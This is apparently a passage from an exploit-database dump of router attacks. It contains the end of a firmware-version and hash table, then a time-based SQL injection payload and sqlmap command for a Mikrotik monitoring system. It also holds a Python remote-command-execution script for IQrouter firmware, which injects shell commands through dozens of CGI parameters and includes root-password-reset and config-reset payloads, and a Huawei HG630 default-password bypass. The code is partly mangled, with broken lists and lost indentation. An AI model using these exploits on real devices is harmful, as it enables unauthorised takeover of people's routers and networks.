#   MBR624GU    V6.01.30.64WW         367530253434926de55988a08e517828  Untested
#   MBR624GU    V6.01.30.61WW         7319b8c9ca2335024693e4f6ad02dfb1  Untested
#   MBR624GU    V6.01.30.59WW         6a78396265425537f2b15473d7f4fff6  Untested
#   MBR624GU    V6.01.30.59NA         e4d0ec49da0956cc8b0fb7ff9461be4f  Untested
#   MBR624GU    V6.00.30.46WW         6f984aa8e172204310226fdee94ab938  Untested
#   MBR624GU    V6.00.28.43WW         e10b0ab92c8edc94975b345a102ef145  Untested
#   MBR624GU    V6.00.28.43NA         5c3e39fed6d914a836c99c397b3f1ec1  Untested
#   MBR624GU    V6.00.26.21WW         ab6b6f1635dc27a6a93c5f172496286a  Untested
#   MBR624GU    V6.00.22.14NA         bafc32d9dc20f686f3162b263f391df6  Untested
#   MBR624GU    V6.00.22.12           7fe0d93833ffe7f74bc829e1054c8312  Untested
#   MBR1200     V1.2.2.53             3ed99932142ee830544022ed0582e1d1  Untested
#   MBR1515     V1.2.2.68             623d9ee0386c50c122fce6f3d6497c94  Untested
#   MBR1516     V1.2.2.84BM           cbf78bd7d7ee6c7a3a5375ae6dc07cec  Untested
#   MBRN3000    V1.0.0.74_2.0.12WW    d496c9abe19b706d688fe11f9d48244f  Untested
#   MBRN3000    V1.0.0.72_2.0.12WW    0e5c04a9053070fbe09501ebd45148fb  Untested
#   MBRN3000    V1.0.0.72_2.0.12NA    f5166bb95613b2c32d4a22b31adea533  Untested
#   MBRN3000    V1.0.0.69_2.0.12WW    621647d9b23d6484c11d35ba8b28fc41  Untested
#   MBRN3000    V1.0.0.69_2.0.12NA    df4a8e61a3573f08e0f7e3c3a4925d45  Untested
#   MBRN3000    V1.0.0.65_2.0.12WW    73f3a1d64c334e947cb5ca1f39f69301  Untested
#   MBRN3000    V1.0.0.65_2.0.12NA    d3ba7bcc00b3d09a72e0b1992c3fcdc4  Untested
#   MBRN3000    V1.0.0.43NA           cad281cfc42d26ffd88762d24074577b  Untested
#   MVBR1210C   V1.2.0.35BM           b36a65b43d84f12254ead93484e64691  Untested
#   R4500       V1.0.0.4_1.0.3        eb878ea3ee999ebd2697d3a1ea6844b0  Untested
#   R6200       V1.0.1.58_1.0.44      c5eb9a42ecad8deb05cdcfbba948489e  Untested
#   R6200       V1.0.1.56_1.0.43      b9ba700570eece0317d2d7e6f69375b1  Untested
#   R6200       V1.0.1.52_1.0.41      d6fd17a8d8dec0cd65f85cf3b423b618  Untested
#   R6200       V1.0.1.48_1.0.37      ba22d5de1d45e7b27ef02b54d76109c1  Untested
#   R6200       V1.0.1.46_1.0.36      3b5ac031b2756daf2a22879750887491  Untested
#   R6200       V1.0.0.28_1.0.24      32748ac05aed521902cdc94c79a9c7d0  Untested
#   R6200       V1.0.0.18_1.0.18      b1e6175e31617dad54a2ebbdc0a0df6c  Untested
#   R6200v2     V1.0.3.12_10.1.11     0b0df46df490bb452369a8b2a8075039  Untested
#   R6200v2     V1.0.3.10_10.1.10     8baf6ea213db77e77888566ceeb39ac1  Untested
#   R6200v2     V1.0.1.20_1.0.18      e11bba1b0c9d7c882da165188d16a83b  Untested
#   R6200v2     V1.0.1.18_1.0.17      5b11e221cee499d20a0615461622ac79  Untested
#   R6200v2     V1.0.1.16_1.0.15      b507812655353cc7ea1c95da7816f820  Untested
#   R6200v2     V1.0.1.14_1.0.14      5076ce08e5bcaba94e510213e59bfff3  Untested
#   R6250       V1.0.4.38_10.1.30     c84cc113aae5aa5a8e540898bda5bd5f  Untested
#   R6250       V1.0.4.36_10.1.30     216a9f879e881b5ae467790761c87ebd  Tested
#   R6250       V1.0.4.34_10.1.28     0dc8a4bab30dbbe4d8afcfcb360187ad  Untested
#   R6250       V1.0.4.26_10.1.23     3f1be99b50d35864d70d2aee5ecc33c6  Untested
#   R6250       V1.0.4.20_10.1.20     2403a8ce4d04a584b19f0cf30f92bf56  Untested
#   R6250       V1.0.4.16_10.1.18     fe6030d67f0a055903e55d405cb91e20  Untested
#   R6250       V1.0.4.14_10.1.17     e0dc56338e8f16c1c38c0845291dafda  Untested
#   R6250       V1.0.4.12_10.1.15     0bc26be95cded31e5453d482085e723c  Untested
#   R6250       V1.0.4.8_10.1.13      8424c65f442d90638a6d0fc9bcf83d35  Untested
#   R6250       V1.0.4.6_10.1.12      356b523cb24085686b65769e1872a583  Untested
#   R6250       V1.0.4.2_10.1.10      4f119505aa1ad2c66db91ee74693442a  Untested
#   R6250       V1.0.3.12_10.1.8      c5ae345bf1d4b790df115ce17a1e2629  Untested
#   R6250       V1.0.3.6_10.1.3       309fefe7f4c6e451adca8339107e3794  Untested
#   R6250       V1.0.1.84_1.0.78      7dfdbdc609b182d6923f486f4d9c5283  Tested
#   R6250       V1.0.1.82_1.0.77      d3cb80a6d4e32ac12a6ca996860179c7  Untested
#   R6250       V1.0.1.80_1.0.75      cb32448faaa7dfc9031e82a80e3c6366  Untested
#   R6250       V1.0.0.72_1.0.71      e8870c350aa8b1831de04528313b4597  Untested
#   R6250       V1.0.0.70_1.0.70      8da51e46e4a0c8ce73b07afbcd4580f3  Untested
#   R6250       V1.0.0.62_1.0.62      c086bcb2c79cf35f4369cf6a99f1c8a5  Untested
#   R6300       V1.0.2.80_1.0.59      5fc46dc531417ecd3a45c7fbe23b2c99  Untested
#   R6300       V1.0.2.78_1.0.58      ae302b1749a6d3462aa218c71b319ec4  Untested
#   R6300       V1.0.2.76_1.0.57      a613643bbce2cec3c79f8f5896de9d9d  Untested
#   R6300       V1.0.2.70_1.0.50      43075b37dd29c100d412ef91bc26130e  Untested
#   R6300       V1.0.2.68_1.0.49      647341220a8706d9dc7c6023a7520f6e  Untested
#   R6300       V1.0.2.38_1.0.33      937ad68339a92c3672b205d26b29f348  Untested
#   R6300       V1.0.2.36_1.0.28      9cceb9d7c494c68304babd23fda58a13  Untested
#   R6300       V1.0.2.26_1.0.26      f44aba5cddc36eedebb08a74b40793db  Untested
#   R6300       V1.0.2.14_1.0.23      d9ce4aca0e55a0777083351958ad939c  Untested
#   R6300       V1.0.2.10_1.0.21      f8ae0c63ea66511e3f8e006d44236e5c  Untested
#   R6300       V1.0.0.90_1.0.18      87bb9b3375847616e30db052708b8442  Untested
#   R6300       V1.0.0.68_1.0.16      f6276b5a3a319c423cb0bf6578098775  Untested
#   R6300v2     V1.0.4.36_10.0.93     ad739a306344ba53c23dcec60b1f25ec  Untested
#   R6300v2     V1.0.4.34_10.0.92     e493f182ecd746d3de18df040a95211a  Untested
#   R6300v2     V1.0.4.32_10.0.91     0842fa456950808a355edb18795112b6  Tested
#   R6300v2     V1.0.4.28_10.0.89     f4ae7abd7bff63b66f096255e4c428ca  Untested
#   R6300v2     V1.0.4.24_10.0.87     e05be33f9f55986c8f606be892fffc69  Untested
#   R6300v2     V1.0.4.8_10.0.77      d6c9b72c67535e159ea7af739cd07926  Untested
#   R6300v2     V1.0.4.6_10.0.76      a3d4fe0c8e7cd91a40724e9c7464fdf6  Untested
#   R6300v2     V1.0.4.2_10.0.74      00f2196125d61b53ffd16dccaa7fde83  Untested
#   R6300v2     V1.0.3.30_10.0.73     00c15e4a4cde88faaf3875914f959a2d  Untested
#   R6300v2     V1.0.3.28_10.0.71     cdb52e60dc2aaf5ca0944131451bad70  Untested
#   R6300v2     V1.0.3.26_10.0.70     3c05bff70e44fa9458739e260d3cb647  Untested
#   R6300v2     V1.0.3.22_10.0.67     6cda020fed0ae522671c15f7620c531f  Untested
#   R6300v2     V1.0.3.8_1.0.60       69637d313345d7d73d8f853ef2cac2b4  Tested
#   R6300v2     V1.0.3.6_1.0.63CH     2871ac95aea8f1907ab2cce316a6dee9  Tested
#   R6300v2     V1.0.3.2_1.0.57       e127e31093baddeee0b445dfb5b0585c  Untested
#   R6300v2     V1.0.2.86_1.0.51      67b4667c4f4d5a46a29bef1a705526ac  Untested
#   R6300v2     V1.0.2.72_1.0.46      b1edb9bbc305d22110f9231892784e3d  Untested
#   R6300v2     V1.0.1.72_1.0.21      907ce31e0d0c1a81f7f39b152490bb6c  Untested
#   R6400       V1.0.1.52_1.0.36      2d9bdc83337eaebd5b0764e4dfbf6615  Untested
#   R6400       V1.0.1.50_1.0.35      82c8c7958cc51705e0388d17494a7e5b  Untested
#   R6400       V1.0.1.46_1.0.32      792259674ad727503af277ec1dfaacb1  Untested
#   R6400       V1.0.1.44_1.0.31      eeab43c47589c596a25b8da901c0b986  Tested
#   R6400       V1.0.1.42_1.0.28      f88a6ffd8b267951c1e3acf49041cb29  Untested
#   R6400       V1.0.1.36_1.0.25      fbaea94679a9e93f317fa887b835aacd  Tested
#   R6400       V1.0.1.34_1.0.24      d272b88f46a0acd88449250bf7cb40d9  Untested
#   R6400       V1.0.1.26_1.0.19      5c52c2422597a786afe6899afa51fe3f  Untested
#   R6400       V1.0.1.24_1.0.18      19e6711c51642615cd8da895bcb4f154  Untested
#   R6400       V1.0.1.22_1.0.17      d790c8858dd1968bb0cbac73e7ae049b  Untested
#   R6400       V1.0.1.20_1.0.16      d8620afd06eb83c41350f490de6792df  Tested
#   R6400       V1.0.1.18_1.0.15      e98f59224c11fe7b7adbe4d35a2ae024  Untested
#   R6400       V1.0.1.12_1.0.11      7541ede9feaa32df1e20b852f7a230a5  Untested
#   R6400       V1.0.1.6_1.0.4        83ba47279692268739d82a7edfafc1ec  Untested
#   R6400       V1.0.0.26_1.0.14      5be5fe81595674f0a11a65982a8cf7e3  Untested
#   R6400       V1.0.0.24_1.0.13      aa8531c26e10e4e4e612ea4a3df3f7c6  Untested
#   R6400       V1.0.0.20_1.0.11      f320cf859f20f3faab341b47d570740e  Untested
#   R6400       V1.0.0.14_1.0.8       b66455bd7c21a54682e9987fa662ec35  Untested
#   R6400v2     V1.0.4.84_10.0.58     25c0a4081adf5ff142074fd0d8014ac7  Untested
#   R6400v2     V1.0.4.82_10.0.57     234bdb2fe2d358fa4dbce974ca98d8b0  Untested
#   R6400v2     V1.0.4.78_10.0.55     c7dad31adf2562df42d1b020a56ab630  Untested
#   R6400v2     V1.0.3.66_10.0.50     585dedb8fa86d0d8f6a4efb5591c501d  Untested
#   R6400v2     V1.0.2.66_10.0.48     43d36ce5d516a6121adff6aec8f5a7c7  Untested
#   R6400v2     V1.0.2.62_10.0.46     11aa8cceef3708d911cb4b2919fe396a  Untested
#   R6400v2     V1.0.2.60_10.0.44     4e73683b8cfaaadac6b0c9a2b5fe81d1  Untested
#   R6400v2     V1.0.2.56_10.0.42     c0bd191a5c021607b9c4627734943cd5  Untested
#   R6400v2     V1.0.2.52_1.0.39      73e31c6da5db634d58245169c430ab4e  Untested
#   R6400v2     V1.0.2.50_1.0.38      d3a9a3d8d1cad0836ceb36c50eda2dbb  Untested
#   R6400v2     V1.0.2.46_1.0.36      5ac0b9b42dc3be8f1fe67a4ea50d766e  Untested
#   R6400v2     V1.0.2.44_1.0.35      a29a8290d6f451aa23db9cc132c8bb13  Untested
#   R6400v2     V1.0.2.34_1.0.22      d609534b475f848709b5957bf65853d7  Untested
#   R6400v2     V1.0.2.32_1.0.20      791b103a3798b00e844007520f0ef10b  Untested
#   R6400v2     V1.0.2.14_1.0.7       f707aab369ee4a0358084f8732df4427  Untested
#   R6700       V1.0.2.8_10.0.53      0aa39d2e46c1597da2ef91894bb016e2  Untested
#   R6700       V1.0.2.6_10.0.52      0a9041cc202ca71633f6fd5b15d621ef  Untested
#   R6700       V1.0.1.48_10.0.46     f9856946d2b2d60ac72149f3db34bd18  Untested
#   R6700       V1.0.1.46_10.0.45     60fbfa7d196f3262b1d5c7f2388815fb  Untested
#   R6700       V1.0.1.44_10.0.44     b034da1c05b9e0e76d980808457b9f7b  Untested
#   R6700       V1.0.1.36_10.0.40     361b453523cd68d1d50f9be9e6affab4  Untested
#   R6700       V1.0.1.32_10.0.38     346a257676872b5322986dd755a26ba0  Untested
#   R6700       V1.0.1.26_10.0.35     d868075504004b20d7788c788a5180b2  Untested
#   R6700       V1.0.1.22_10.0.33     66bc7b05ac8c546f7f896a9829f01adf  Untested
#   R6700       V1.0.1.20_10.0.32     43ae34c752dacb9f842947165115568d  Untested
#   R6700       V1.0.1.16_10.0.30     56e60ce42c6b4eb204e5c192a3cc7021  Untested
#   R6700       V1.0.1.14_10.0.29     1f8d3fbcc6e12424692ad371fd895b34  Untested
#   R6700       V1.0.0.26_10.0.26     e57c70b7d76855b8df473a8ecc8d4b2c  Untested
#   R6700       V1.0.0.24_10.0.18     0a63a44df72c4ad9479df8552c9bdf96  Untested
#   R6700       V1.0.0.2_1.0.1        9990354d0687c8cde7f42aa025eec7c2  Untested
#   R6700v3     V1.0.4.84_10.0.58     25c0a4081adf5ff142074fd0d8014ac7  Untested
#   R6700v3     V1.0.4.82_10.0.57     234bdb2fe2d358fa4dbce974ca98d8b0  Untested
#   R6700v3     V1.0.4.78_10.0.55     c7dad31adf2562df42d1b020a56ab630  Untested
#   R6700v3     V1.0.3.66_10.0.50     585dedb8fa86d0d8f6a4efb5591c501d  Untested
#   R6700v3     V1.0.2.66_10.0.48     43d36ce5d516a6121adff6aec8f5a7c7  Untested
#   R6700v3     V1.0.2.62_10.0.46     11aa8cceef3708d911cb4b2919fe396a  Untested
#   R6700v3     V1.0.2.60_10.0.44     4e73683b8cfaaadac6b0c9a2b5fe81d1  Untested
#   R6700v3     V1.0.2.56_10.0.42     c0bd191a5c021607b9c4627734943cd5  Untested
#   R6700v3     V1.0.2.52_1.0.39      73e31c6da5db634d58245169c430ab4e  Untested
#   R6900       V1.0.2.8_10.0.38      d81bc8a57b9430527fb706d516eed382  Untested
#   R6900       V1.0.2.6_10.0.37      b87b38710ef5977179d503bc9bf66c13  Untested
#   R6900       V1.0.2.4_10.0.35      9e79f7b6256d96609a7a461829d8248e  Untested
#   R6900       V1.0.1.48_10.0.30     8784f761ecd1b354649f6cf8c2c5b99f  Untested
#   R6900       V1.0.1.46_10.0.29     37400b051afec889ab58b056d5bb3c86  Untested
#   R6900       V1.0.1.44_10.0.28     9784f4edd86b697c94acde2276179de3  Untested
#   R6900       V1.0.1.34_1.0.24      d01623ce7b7493963aa159a60e07fe19  Untested
#   R6900       V1.0.1.28_1.0.21      541352d81d7ce6c70707f858e03d3ad3  Untested
#   R6900       V1.0.1.26_1.0.20      acbcba2cf243924e324e07b625d8f6b9  Untested
#   R6900       V1.0.1.22_1.0.18      01c44643eb33073d5e6ad845227f798a  Untested
#   R6900       V1.0.1.20_1.0.17      8c26c3b7f0f24f98acda07da2ccad65e  Untested
#   R6900       V1.0.1.16_1.0.15      7e599f7ebee500d6f085f531a6f1e934  Untested
#   R6900       V1.0.1.14_1.0.14      de1af2d6fdc38f2efa7dc19f71110b77  Untested
#   R6900       V1.0.0.4_1.0.10       f7cdbfd458403617025681b9fd545df8  Untested
#   R6900       V1.0.0.2_1.0.2        4f1253f17d5892a6ad139b17f8122d95  Untested
#   R6900P      V1.3.1.64_10.1.36     73230b02c8371d16933b86caea3406c8  Untested
#   R6900P      V1.3.1.44_10.1.23     c94a81a643471975801c1f65f30fa09e  Untested
#   R6900P      V1.3.1.26_10.1.3      350a0ce80d8448f89821c84c5c24e77a  Untested
#   R6900P      V1.3.0.20_10.1.1      57f68b9174f20c1cb9076e893f7c7e3e  Untested
#   R6900P      V1.3.0.8_1.0.93       72df20b0f868e8fb896dc1c89b2f7c9a  Untested
#   R6900P      V1.2.0.22_1.0.78      89b5c3b5f8f75715b01eca80d8423adc  Untested
#   R6900P      V1.0.1.14_1.0.59      8731b6fcf8aa73adec7175c4fa30d623  Untested
#   R6900P      V1.0.0.58_1.0.50      d04818c010e0bcfeef910cb8c0bd217e  Untested
#   R6900P      V1.0.0.46_1.0.30      d2f1f602054a8475aebd563d9373c59c  Untested
#   R7000       V1.0.11.100_10.2.100  f39d1a3be29d903a5de78a876a92f247  Tested
#   R7000       V1.0.9.88_10.2.88     1e4a56c9fa6a0b1ddb12c93260aa86b9  Tested
#   R7000       V1.0.9.64_10.2.64     2545e4d62fe606c9235301b13fe51c4a  Tested
#   R7000       V1.0.9.60_10.2.60     0c1face67db74dae80477937e375c90f  Tested
#   R7000       V1.0.9.42_10.2.44     9db15cdabcb182c5a8c352f4d62240aa  Tested
#   R7000       V1.0.9.34_10.2.36     0130c6ef44df28825c34998ec1ed9d28  Tested
#   R7000       V1.0.9.32_10.2.34     d63cc30511ec16eb22aea2ad4536c482  Untested
#   R7000       V1.0.9.28_10.2.32     65fdddb6075d231981d0b0b0b173b957  Untested
#   R7000       V1.0.9.26_10.2.31     e7eb90b86b4cf80fc498a3a2a1cde4b6  Tested
#   R7000       V1.0.9.18_1.2.27      62f58a3b03d2ffe4da6def29dc57fd62  Tested
#   R7000       V1.0.9.14_1.2.25      933a68fd113502dbe5ee5eda56d76c4d  Tested
#   R7000       V1.0.9.12_1.2.23      0815e4c5d8bf72f3bc8f8a7c3c5151a5  Tested
#   R7000       V1.0.9.10_1.2.21      89caf1296fb771f6f710fdaa11b1eee4  Tested
#   R7000",
2020-05-18,WebApps,Hardware,jul10l1r4,Mikrotik Router Monitoring System 1.2.3,'community' SQL Injection,"# Exploit Title: Mikrotik Router Monitoring System 1.2.3 - 'community' SQL Injection
# Exploit Author: jul10l1r4 (Julio Lira)
# Google Dork: N/A
# Date: 2020-05-16
# Vendor Homepage: https://mikrotik.com
# Software Link: https://mikrotik.com/download
# Version: <= 1.2.3
# Tested on: Debian 10 buster
# CVE: 2020-13118
Description: SQL Injection found in check_community.php:49
http://localhost/check_community.php?community=1' AND (SELECT 6941 FROM (SELECT(SLEEP(10)))Qaxg) AND 'sdHI'='sdHI","$community = $_GET['community'];
$_SESSION['community'] = $community;
$query = ""SELECT name from router where `community`='
$community'"";
PoC:
SQLmap using:
sqlmap -u 'http://localhost/check_community.php?community=1' --level=5 --risk=3"
2020-04-21,WebApps,Hardware,drakylar,IQrouter 3.3.1 Firmware,Remote Code Execution,"# Exploit Title: IQrouter 3.3.1 Firmware - Remote Code Execution
# Date: 2020-04-21
# Exploit Author: drakylar
# Vendor Homepage: https://evenroute.com/
# Software Link: https://evenroute.com/iqrouter
# Version: IQrouter firmware up to 3.3.1
# Tested on: IQrouter firmware 3.3.1
# CVE : N/A
#!/usr/bin/env python3
#           IQrouter multiple RCE and other vulnerabilities           #
#                   by drakylar (Shaposhnikov Ilya)                   #
#            CVE-2020-11963 CVE-2020-11964 CVE-2020-11966             #
#                    CVE-2020-11967 CVE-2020-11968                    #","import argparse
from sys import argv, exit
try:
import requests
except ImportError:
print(""Install requests lib! pip3 install requests"")
print(""""""
rce_setup = [
""/cgi-bin/luci/er/vlanTag?vlan_tag='`{}`'"",
""RCE /vlanTag (vlan_tag param)""
""/cgi-bin/luci/er/verify_wifi?wifi_conflict='`{}`'"",
""RCE /verify_wifi (wifi_conflict param). Need hide_wifi_config != true""
""/cgi-bin/luci/er/screen9?save_creds=1&s1&s2='`{}`'&p1&p2"",
""RCE /screen9 (s2 param)""
""/cgi-bin/luci/er/screen9?save_creds=1&s1='`{}`'&s2&p1&p2"",
""RCE /screen9 (s1 param)""
""/cgi-bin/luci/er/screen9?save_creds=1&s1&s2&p1&p2='`{}`'"",
""RCE /screen9 (p2 param)""
""/cgi-bin/luci/er/screen9?save_creds=1&s1&s2&p1='`{}`'&p2"",
""RCE /screen9 (p1 param)""
""/cgi-bin/luci/er/screen4?save_isp='`{}`"",
""RCE /screen4 (save_isp param)""
""/cgi-bin/luci/er/screen2?set_wan_modem_interfaces='`{}`'"",
""RCE /screen2 set_wan_modem_interfaces param)""
""/cgi-bin/luci/er/screen2?find_ip_address_conflict='`{}`'"",
""RCE /screen2 find_ip_address_conflict param)""
""/cgi-bin/luci/er/screen10?set_security_question='`{}`'"",
""RCE /screen10 (set_security_question param)""
""/cgi-bin/luci/er/screen10?set_security_answer='`{}`'&set_security_question=1"",
""RCE /screen10 (set_security_answer param)""],
""/cgi-bin/luci/er/screen1?zonename='`{}`'"",
""RCE /screen1 (zonename param)""
""/cgi-bin/luci/er/register?email=`{}`"",
""RCE /register (email param, result in /cgi-bin/luci/er/get_syslog for result)""
rce_any = [
""/cgi-bin/luci/er/wifi?enable_guestwifi=1&guest_key=2&disable_guestwifi=1&connection_test=1&disassociate_low_ack_update=1&guestwifi_2g_ssid=3&guestwifi_5g_ssid=4&get_network_details=1&switch_reset_wifi_mode=1&save_creds=1&s1=1&s2='`{}`'&p1=1&p2=1"",
""RCE /wifi (s2 param)""
""/cgi-bin/luci/er/wifi?enable_guestwifi=1&guest_key=2&disable_guestwifi=1&connection_test=1&disassociate_low_ack_update=1&guestwifi_2g_ssid=3&guestwifi_5g_ssid=4&get_network_details=1&switch_reset_wifi_mode=1&save_creds=1&s1='`{}`'&s2=5&p1=6&p2=7"",
""RCE /wifi (s1 param)""
""/cgi-bin/luci/er/wifi?enable_guestwifi=1&guest_key=2&disable_guestwifi=1&connection_test=1&disassociate_low_ack_update=1&guestwifi_2g_ssid=3&guestwifi_5g_ssid=4&get_network_details=1&switch_reset_wifi_mode=1&save_creds=1&s1=1&s2=2&p1=3&p2='`{}`'"",
""RCE /wifi (p2 param)""
""/cgi-bin/luci/er/wifi?enable_guestwifi=1&guest_key=2&disable_guestwifi=1&connection_test=1&disassociate_low_ack_update=1&guestwifi_2g_ssid=3&guestwifi_5g_ssid=4&get_network_details=1&switch_reset_wifi_mode=1&save_creds=1&s1=1&s2=2&p1='`{}`'&p2=4"",
""RCE /wifi (p1 param)""
""/cgi-bin/luci/er/wifi?enable_guestwifi=1&guest_key=2&disable_guestwifi=1&connection_test=1&disassociate_low_ack_update=1&guestwifi_2g_ssid=3&guestwifi_5g_ssid=`{}`&get_network_details=1&switch_reset_wifi_mode=1&save_creds=1&s1=4&s2=5&p1=6&p2=7"",
""RCE /wifi (guestwifi_5g_ssid param)""
""/cgi-bin/luci/er/wifi?enable_guestwifi=1&guest_key=2&disable_guestwifi=1&connection_test=1&disassociate_low_ack_update=1&guestwifi_2g_ssid=`{}`&guestwifi_5g_ssid=3&get_network_details=1&switch_reset_wifi_mode=1&save_creds=1&s1=4&s2=5&p1=6&p2=7"",
""RCE /wifi (guestwifi_2g_ssid param)""
""/cgi-bin/luci/er/wifi?enable_guestwifi=1&guest_key='`{}`'&disable_guestwifi=1&connection_test=1&disassociate_low_ack_update=1&guestwifi_2g_ssid=2&guestwifi_5g_ssid=3&get_network_details=1&switch_reset_wifi_mode=1&save_creds=1&s1=4&s2=5&p1=6&p2=7"",
""RCE /wifi (guest_key param)""
""/cgi-bin/luci/er/wifi?enable_guestwifi='`{}`'&guest_key=2&disable_guestwifi=1&connection_test=1&disassociate_low_ack_update=1&guestwifi_2g_ssid=3&guestwifi_5g_ssid=4&get_network_details=1&switch_reset_wifi_mode=1&save_creds=1&s1=5&s2=6&p1=6&p2=7"",
""RCE /wifi (enable_guestwifi param)""
""/cgi-bin/luci/er/screen11.1?email=`{}`&register=123&uilog=123&bg=123"",
""RCE /screen11.1 (email param)""
""/cgi-bin/luci/er/reboot_link?link='`{}`'"",
""RCE /reboot_link (link param)""
""/cgi-bin/luci/er/diag_wifi/1/2/3/4/5/'`{}`'/"",
""RCE /diag_wifi (htm5ghz param)""
""/cgi-bin/luci/er/diag_wifi/1/2/3/4/'`{}`'/6/"",
""RCE /diag_wifi (htm2ghz param)""
""/cgi-bin/luci/er/diag_wifi/1/2/3/'`{}`'/5/6/"",
""RCE /diag_wifi (c5ghz param)""
""/cgi-bin/luci/er/diag_wifi/1/2/'`{}`'/4/5/6/"",
""RCE /diag_wifi (c2ghz param)""
""/cgi-bin/luci/er/diag_set_static_wan/'`{}`'/2/3/4/"",
""RCE /diag_set_static_wan (static_ip param)""
""/cgi-bin/luci/er/diag_set_static_wan/1/'`{}`'/3/4/"",
""RCE /diag_set_static_wan (net_mask param)""
""/cgi-bin/luci/er/diag_set_static_wan/1/2/'`{}`'/4/"",
""RCE /diag_set_static_wan (gateway param)""
""/cgi-bin/luci/er/diag_set_static_wan/1/2/3/'`{}`'/"",
""RCE /diag_set_static_wan (dns param)""
""/cgi-bin/luci/er/diag_set_static_modem/'`{}`'/2/3/"",
""RCE /diag_set_static_modem (static_ip param)""
""/cgi-bin/luci/er/diag_set_static_modem/1/'`{}`'/3/"",
""RCE /diag_set_static_modem (net_mask param)""
""/cgi-bin/luci/er/diag_set_static_modem/1/2/'`{}`'/"",
""RCE /diag_set_static_modem (gateway param)""
""/cgi-bin/luci/er/diag_set_device_name_and_sync/'`{}`'/"",
""RCE /diag_set_device_name_and_sync (device_name param)""
""/cgi-bin/luci/er/diag_set_device_name/'`{}`'/"",
""RCE /diag_set_device_name (device_name param)""
""/cgi-bin/luci/er/diag_pppoe_update/'`{}`'/passs/"",
""RCE /diag_pppoe_update (wan_username param)""
""/cgi-bin/luci/er/diag_pppoe_update/aaadmin/'`{}`'/"",
""RCE /diag_pppoe_update (wan_password param)""
""/cgi-bin/luci/er/diag_pppoe/'`{}`'/passsswd/"",
""RCE /diag_pppoe (wan_username param)""
""/cgi-bin/luci/er/diag_pppoe/aaadmin/'`{}`'/"",
""RCE /diag_pppoe (wan_password param)""
""/cgi-bin/luci/er/diag_pppoa_update/'`{}`'/paaaasword/"",
""RCE /diag_pppoa_update (wan_username param)""
""/cgi-bin/luci/er/diag_pppoa_update/aaadmin/'`{}`'/"",
""RCE /diag_pppoa_update (wan_password param)""
""/cgi-bin/luci/er/diag_pppoa/'`{}`'/passs/"",
""RCE /diag_pppoa (wan_username param)""
""/cgi-bin/luci/er/diag_pppoa/aaadmin/'`{}`'/"",
""RCE /diag_pppoa (wan_password param)""
""/cgi-bin/luci/er/advanced_link?link='`{}`'"",
""RCE /advanced_link (link param)""
advanced_payloads = [
""/cgi-bin/luci/er/reboot_link?reboot=1"",
""Reboot IQrouter (/reboot_link reboot param))""
""/cgi-bin/luci/er/screen2?reboot=1"",
""Reboot IQrouter (/screen2 reboot param))""
""/cgi-bin/luci/er/index?reset_config=1"",
""Reset IQrouter (/index reset_config param)""
""/cgi-bin/luci/er/screen7?upgrade=1"",
""Upgrade IQrouter (/screen7 upgrade param)""
""/cgi-bin/luci/er/vlanTag?restart_network=1"",
""Restart network (/vlanTag restart_network param)""
""/cgi-bin/luci/er/diag_iperf_cmd/start"",
""Start iperf script (/diag_iperf_cmd/start)""
""/cgi-bin/luci/er/diag_iperf_cmd/stop"",
""Stop iperf script (/diag_iperf_cmd/stop)""
""/cgi-bin/luci/er/get_syslog"",
""Router setup info log (/get_syslog)""
""/cgi-bin/luci/er/diag_set_password/c00lpasswd/"",
""Change root password to c00lpasswd (can change in code)""
""/cgi-bin/luci/er/reset_password/"",
""Change root password to 'changeme' (static)""
def print_payloads():
print('#' * 30)
print(""Payloads list"")
num = 1
print('#########################  RCE without auth  ########################')
for payload in rce_any:
print(""{} - {}"".format(num, payload[1]))
num += 1
print(
'###############  RCE (router need to be in setup mode)  ###############')
for payload in rce_setup:
print(""{} - {}"".format(num, payload[1]))
num += 1
print(
'#########################  Advanced payloads  #########################')
for payload in advanced_payloads:
print(""{} - {}"".format(num, payload[1]))
num += 1
parser = argparse.ArgumentParser(description=""IQrouter multiple RCE"")
parser.add_argument('--host', help='Host', type=str)
parser.add_argument('-p', '--port', help='Web port (default: 80)', default=80, type=int)
parser.add_argument('-n', '--num', help='Payload number',
default=0, type=int)
parser.add_argument('-c', '--cmd', help='Command to execute (default: pwd)',
default=""pwd"", type=str)
parser.add_argument('--protocol', help='Protocol (http/https)',
default=""http"", type=str)
args = parser.parse_args()
def main():
print("""")
full_payload_list = rce_setup + rce_any + advanced_payloads
payloads_amount = len(full_payload_list)
try:
hostname = args.host
port = args.port
payload_num = int(args.num)
bash_cmd = args.cmd
protocol = args.protocol
if payload_num < 1 or payload_num > payloads_amount:
print(""Error with payload number!"")
raise IndexError
if port < 0 or port > 65535:
print(""Error with port number"")
raise IndexError
if protocol not in ['http', 'https']:
print(""Error with protocol name"")
raise IndexError
current_payload = full_payload_list[payload_num - 1]
print(""Payload: {}"".format(current_payload[1]))
print(""Host: {}"".format(hostname))
print(""Port: {}"".format(port))
print(""Protocol: {}"".format(protocol))
print(""Command: {}"".format(bash_cmd))
full_url = ""{}://{}:{}{}"".format(protocol, hostname, port,
current_payload[0].format(bash_cmd))
print(""Built URL: {}"".format(full_url))
r = requests.get(full_url)
print(""Status code: {}"".format(r.status_code))
return
except IndexError:
parser.print_help()
print_payloads()
exit(1)
if __name__ == '__main__':
print(
""\n\nWarning: use TABS(doesn't work in some payloads) or ${IFS} for space."")
exit(main())"
2020-04-13,WebApps,Hardware,Eslam Medhat,Huawei HG630 2 Router,Authentication Bypass,"# Title: Huawei HG630 2 Router - Authentication Bypass
# Date: 2020-04-13
# Author: Eslam Medhat
# Vendor Homepage: www.huawei.com
# Version: HG630 V2
# HardwareVersion: VER.B
# CVE: N/A
#POC:
#Reference:
https://www.youtube.com/watch?v=vOrIL7L_cVc","The default password of this router is the last 8 characters of the
device's serial number which exist in the back of the device.
An attacker can leak the serial number via the web app API like the
following:
************************Request************************
GET /api/system/deviceinfo HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0)
Gecko/20100101 Firefox/65.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://192.168.1.1/
X-Requested-With: XMLHttpRequest
Connection: close
Cookie:
SessionID_R3=0PVHKCwY01etBMntI9TZZRvYX04emsjws0Be4EQ8VcoojhWaRQpOV9E0BbAktJDwzI0au6s1xgl0Cn7bvN9rejjMhJCI1t07f2XDnbo09tjN4mcG0XMyXbMoJLjViHm
************************Response************************
HTTP/1.1 200 OK
